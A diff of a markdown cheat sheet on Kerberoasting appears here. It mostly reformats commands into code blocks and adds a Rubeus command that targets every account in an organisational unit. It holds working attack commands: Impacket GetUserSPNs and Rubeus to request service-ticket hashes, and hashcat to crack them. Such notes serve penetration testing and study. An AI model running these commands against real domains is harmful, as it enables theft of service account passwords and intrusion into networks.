@@ -10,9 +10,9 @@
 
 ### Get hash (TGS)
 
- - Impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/USER:PASSWORD
+    Impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/USER:PASSWORD
 
- - Rubeus kerberoast
+    Rubeus kerberoast
 
 ### Allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.
 
@@ -20,13 +20,19 @@
 
 ## Steps:
 
-#### 1) python3 Impacket-GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASSWORD
+#### 1) 
+
+    python3 Impacket-GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASSWORD
 
 #### Insert Password:
 
-#### 2) python3 Impacket-GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASSWORD -request
+#### 2) 
 
-#### 3) hashcat -a 0 -m 13100 SPN.HASH /path/to/wordlist.txt
+    python3 Impacket-GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASSWORD -request
+
+#### 3) 
+
+    hashcat -a 0 -m 13100 SPN.HASH /path/to/wordlist.txt
 
 # Do Kerberoasting
 
@@ -53,6 +59,10 @@
 ##### Specific users
 
     Rubeus.exe kerberoast /user:[User] /nowrap
+
+##### All users in OU
+
+    Rubeus.exe kerberoast /ou:OU=Service_Accounts,DC=Security,DC=local
 
 ##### List statistics about found Kerberoastable accounts (Quiet)
 
